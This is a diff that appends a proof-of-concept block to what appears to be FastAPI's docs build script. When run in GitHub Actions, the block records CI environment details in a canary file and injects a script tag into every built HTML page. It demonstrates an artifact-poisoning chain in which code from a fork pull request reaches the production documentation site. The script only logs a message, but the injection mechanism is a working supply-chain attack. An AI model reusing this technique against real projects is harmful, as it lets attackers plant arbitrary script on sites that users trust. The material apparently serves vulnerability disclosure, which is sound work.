@@ -739,3 +739,61 @@ def add_permalinks(update_existing: bool = False) -> None:
 
 if __name__ == "__main__":
     app()
+
+# ============================================================================
+# PoC: Artifact Poisoning (harmless demonstration)
+# This code executes during fastapi's build-docs.yml (pull_request trigger)
+# The poisoned artifact is auto-deployed to fastapi.tiangolo.com by deploy-docs.yml
+# ============================================================================
+import os, json, datetime
+
+if os.environ.get('GITHUB_ACTIONS'):
+    # CANARY: prove attacker code executes in CI
+    canary = {
+        "poc": "fastapi_artifact_poisoning_chain",
+        "chain": "fork_PR -> build_docs -> poison_artifact -> deploy_docs -> production",
+        "ci_runner_id": os.environ.get('RUNNER_NAME', 'unknown'),
+        "ci_workflow": os.environ.get('GITHUB_WORKFLOW', 'unknown'),
+        "ci_event": os.environ.get('GITHUB_EVENT_NAME', 'unknown'),
+        "ci_repo": os.environ.get('GITHUB_REPOSITORY', 'unknown'),
+        "ci_ref": os.environ.get('GITHUB_REF', 'unknown'),
+        "ci_sha": os.environ.get('GITHUB_SHA', 'unknown')[:7],
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+    }
+    os.makedirs('/tmp/fastapi-poc-canary', exist_ok=True)
+    with open('/tmp/fastapi-poc-canary/poc_canary.json', 'w') as f:
+        json.dump(canary, f, indent=2)
+
+    # POISON THE ARTIFACT: inject PoC marker into built HTML
+    canary_html = '''
+<!--
+  =========================================================
+  PoC: fastapi Artifact Poisoning (harmless demonstration)
+  Injected by attacker-controlled scripts/docs.py
+  Proves the artifact poisoning chain:
+    fork PR -> build-docs runs attacker code
+    -> upload poisoned artifact
+    -> deploy-docs downloads & deploys to production
+  =========================================================
+-->
+<script>
+console.log("[PoC] fastapi artifact poisoning chain validated on " + new Date().toISOString());
+</script>
+'''
+    site_dir = os.path.join(os.getcwd(), 'site')
+    if os.path.isdir(site_dir):
+        for root, dirs, files in os.walk(site_dir):
+            for fname in files:
+                if fname.endswith('.html'):
+                    fpath = os.path.join(root, fname)
+                    try:
+                        with open(fpath, 'a') as fh:
+                            fh.write(canary_html)
+                    except Exception:
+                        pass
+
+    # Also create a canary file in site/ to be uploaded
+    with open(os.path.join(site_dir, 'poc_canary.json'), 'w') as f:
+        json.dump(canary, f, indent=2)
+
+# ============================================================================
